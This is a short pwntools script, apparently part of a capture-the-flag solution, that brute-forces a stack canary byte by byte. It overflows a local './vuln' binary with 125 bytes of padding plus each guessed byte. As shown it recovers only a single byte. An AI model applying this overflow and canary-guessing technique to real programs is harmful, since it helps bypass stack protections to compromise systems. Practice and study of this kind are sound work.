from pwn import *
context.clear(arch='i386')
elf = ELF('./vuln')

# bruteforce one byte at a time
known = ''
for i in range(32, 127):
    rop = ROP(elf)
    rop.raw("A" * 125 + known + chr(i))
    p = process('./vuln')
    p.recvuntil(b"How Many Bytes will You Write Into the Buffer?\n")
    p.send(str(len(rop.chain())).encode())
    p.send(rop.chain())
    result = p.recvline()
    if b'Ok... Now Where\'s the Flag?' in result:
        log.success(f'Canary value: {i} {chr(i)}')
        break
    p.close()
